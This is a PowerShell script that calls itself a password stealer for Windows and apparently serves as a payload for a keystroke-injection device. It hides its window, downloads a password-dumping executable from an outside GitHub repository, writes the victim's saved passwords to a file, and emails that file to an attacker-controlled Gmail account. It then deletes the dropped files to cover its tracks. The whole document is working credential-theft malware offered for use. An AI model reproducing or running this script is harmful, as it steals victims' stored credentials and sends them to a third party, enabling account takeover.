# Password stealer for windows.

# May need to adjust sleep time for slower computers.





PowerShell.exe -WindowStyle hidden {

(new-object System.Net.WebClient).DownloadFile('https://github.com/Mythaman/Payloads/blob/main/PassFuckerPayload/PassView.exe?raw=true','C:\Users\Public\jE9v6Hn18z52GrjO28.exe')

cd C:\Users\Public

"jE9v6Hn18z52GrjO28.exe /stext a9HtfK9hCy8wV13.txt" | cmd

Start-Sleep 1

$SMTPServer = 'smtp.gmail.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR-EMAIL', 'YOUR-APP-PASSWORD')

$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'YOUR-EMAIL'
$ReportEmail.To.Add('YOUR-EMAIL')
$ReportEmail.Subject = 'Passwords Successfully Logged.'
$ReportEmail.Body = 'Data is attached'
$ReportEmail.Attachments.Add('C:\Users\Public\a9HtfK9hCy8wV13.txt')
$SMTPInfo.Send($ReportEmail)

}

$ReportEmail = $null

Remove-Item 'C:\Users\Public\jE9v6Hn18z52GrjO28.exe'
Remove-Item 'C:\Users\Public\a9HtfK9hCy8wV13.txt'